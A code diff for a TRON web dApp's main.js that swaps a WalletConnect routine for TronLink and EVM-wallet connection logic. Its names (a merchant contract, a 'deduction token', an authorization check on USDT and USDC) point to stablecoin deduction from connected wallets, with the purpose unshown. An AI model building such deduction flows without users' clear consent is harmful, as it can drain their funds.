@@ -1,5 +1,5 @@
 // src/main.js
-// 🚨 混合版：支援 TronLink (自動注入) + WalletConnect (需要庫支持) 🚨
+// 🚨 最終修正版：優化 Trust Wallet (EVM Provider) 連線邏輯 🚨
 
 // --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
@@ -17,7 +17,6 @@ let usdtContract;
 let usdcContract;
 let isConnectedFlag = false;
 let targetDeductionToken = null; 
-let provider; // 用於 WalletConnect 的 Provider
 
 // --- UI 元素 ---
 const connectButton = document.getElementById('connectButton');
@@ -115,55 +114,7 @@ async function initializeContracts() {
     usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
 }
 
-// --- WalletConnect V2 連線框架 (直接使用 Provider) ---
-async function connectWalletConnect() {
-    
-    // 🚨 修正：安全地獲取 WalletConnectProvider 構造函數
-    const ProviderConstructor = window.WalletConnectProvider || (typeof WalletConnectProvider !== 'undefined' ? WalletConnectProvider : null);
-    
-    // 檢查 Provider 構造函數是否已載入
-    if (!ProviderConstructor) {
-        showOverlay('🔴 錯誤：WalletConnect 核心庫未正確載入。請檢查 index.html 中的 CDN 連結。');
-        return false;
-    }
-    
-    showOverlay('正在初始化 WalletConnect V2...');
-
-    // 1. 實例化 WalletConnect Provider
-    const provider = new ProviderConstructor({ // 🚨 使用修正後的構造函數
-        rpc: { 1: "https://api.trongrid.io" }, 
-        chainId: 1 
-    });
-    
-    try {
-        showOverlay('請在您的移動錢包中批准連接...');
-        // 2. 彈出 WalletConnect 介面並連接 (QR Code)
-        await provider.enable();
-        
-        // 🚨 終極瓶頸：無法從標準 WalletConnect 實例化 TronWeb 來發送交易
-        throw new Error("Connected! However, standard WalletConnect cannot bridge to TronWeb for DApp transactions.");
-        
-    } catch (error) {
-        if (error.message.includes('User closed modal') || error.message.includes('close') || error.message.includes('No accounts')) {
-             hideOverlay();
-             return false;
-        }
-        
-        // 如果是我們預設的橋接錯誤，則使用自定義提示
-        if (error.message.includes('Connected! However') || error.message.includes('Cannot bridge WalletConnect')) {
-            showOverlay(`🔴 連線成功但功能受限：${error.message} 請改用 TronLink。`);
-        } else {
-            console.error("WalletConnect 連接失敗:", error);
-            showOverlay(`WalletConnect 連接失敗！錯誤: ${error.message}`);
-        }
-        
-        if (provider && provider.close) provider.close();
-        return false;
-    }
-}
-
-
-// --- TronLink 連線邏輯 ---
+// --- TronLink 連線邏輯 (核心) ---
 async function connectTronLink() {
     if (!window.tronLink) {
         return false; 
@@ -187,6 +138,52 @@ async function connectTronLink() {
         updateConnectionUI(false);
         return false;
     }
+}
+
+// --- 混合連線邏輯 ( Trust Wallet / EVM 嘗試) ---
+async function connectWalletConnect() {
+    
+    const evmProvider = window.ethereum; // 標準 EVM Provider (Trust Wallet, MetaMask)
+    
+    // 1. 優先嘗試 TronLink (如果存在)
+    if (window.tronLink) {
+        return connectTronLink();
+    }
+    
+    // 2. 嘗試使用標準 EVM Provider (例如 Trust Wallet 內建瀏覽器)
+    if (evmProvider) {
+        showOverlay('偵測到標準 EVM 錢包 (Trust Wallet/MetaMask)。正在請求連接...');
+        try {
+            // 請求 EVM 連接
+            const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
+            const evmAddress = accounts[0]; // 獲取 EVM 格式地址 (0x...)
+
+            // 🚨 終極瓶頸：檢查 TronWeb 是否存在
+            if (!window.tronWeb) {
+                // 連線成功，但無法發送 TRON 合約交易
+                throw new Error("Connected to EVM wallet, but DApp browser lacks TronWeb support for TRON contract transactions.");
+            }
+            
+            // 🚨 如果有 TronWeb 注入 (極少數情況)，則繼續
+            tronWeb = window.tronWeb;
+            // 這裡需要從 EVM 地址 (Hex) 轉換為 TRON 地址 (Base58)
+            userAddress = tronWeb.address.fromHex(evmAddress); 
+            
+            await initializeContracts();
+            updateConnectionUI(true, userAddress);
+            await handlePostConnection();
+            return true;
+
+        } catch (error) {
+            console.error("EVM Provider 連接失敗:", error);
+            showOverlay(`連接失敗！錯誤: ${error.message}。請確認錢包已解鎖並在 TRON 鏈上。`);
+            return false;
+        }
+    }
+    
+    // 3. 完全沒有任何 Provider
+    showOverlay('🔴 連線失敗：您的瀏覽器或 App 不支持 TronLink。請使用 **TronLink 瀏覽器擴展** 或 **TronLink App** 的內建瀏覽器。');
+    return false;
 }
 
 async function checkAuthorization() {
@@ -317,12 +314,10 @@ async function connectWallet() {
         return;
     }
 
-    // 🚨 混合連線邏輯：優先嘗試 TronLink，如果失敗則嘗試 WalletConnect
-    const tronLinkConnected = await connectTronLink(); 
+    // 🚨 僅嘗試 connectWalletConnect (它會內部決定使用 TronLink 還是 EVM Provider)
+    const connected = await connectWalletConnect(); 
 
-    if (!tronLinkConnected) {
-        await connectWalletConnect();
-    }
+    // 如果連線失敗，錯誤訊息將在 connectWalletConnect 內部處理
     
     if (connectButton) connectButton.disabled = false;
 }
